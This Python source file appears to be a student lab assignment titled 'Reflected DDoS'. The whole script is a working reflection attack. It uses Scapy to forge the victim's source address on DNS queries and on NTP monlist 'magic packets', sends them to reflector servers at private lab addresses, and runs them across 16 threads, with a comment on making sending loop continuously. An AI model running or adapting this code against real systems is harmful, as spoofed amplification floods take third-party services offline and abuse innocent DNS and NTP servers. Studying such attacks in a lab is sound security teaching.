"""
Luyckx Marco 496283
Bouhnine Ayoub 500048

Reflected DDoS
"""
from scapy.all import *
import concurrent.futures
import sys
import time


def dns_ddos(target, dns_server):

    ip = IP(src=target, dst=dns_server)
    udp = UDP(dport=53)
    dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname="google.com", qtype=225))

    request = (ip/udp/dns)

    send(request)

def ntp_ddos(target, ntp_server):
    #Magic Packet aka NTP v2 Monlist Packet
    data = "\x17\x00\x03\x2a" + "\x00" * 4
    packet = IP(dst=ntp_server,src=target)/UDP(sport=random.randint(2000,65535),dport=123)/Raw(load=data)
    send(packet) # or add the parameter loop=1

if __name__ == "__main__":
    target = "10.12.0.10"
    dns_server = "10.12.0.20"
    ntp_server = "10.12.0.30"
    # dns_ddos(target="10.12.0.10", dns_server="10.12.0.20") # target webserver for example
    # ntp_ddos(target="10.12.0.10", ntp_server="10.12.0.30")

    start_time = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
        futures = []
        for i in range(16):
            if (i % 2 == 0):
                futures.append(executor.submit(
                    dns_ddos, target, dns_server))
            else:
                futures.append(executor.submit(
                    ntp_ddos, target, ntp_server))

        for future in concurrent.futures.as_completed(futures):
            if future.result():
                executor.shutdown(wait=False)
                print('Time taken :', time.time() - start_time)
                sys.exit(0)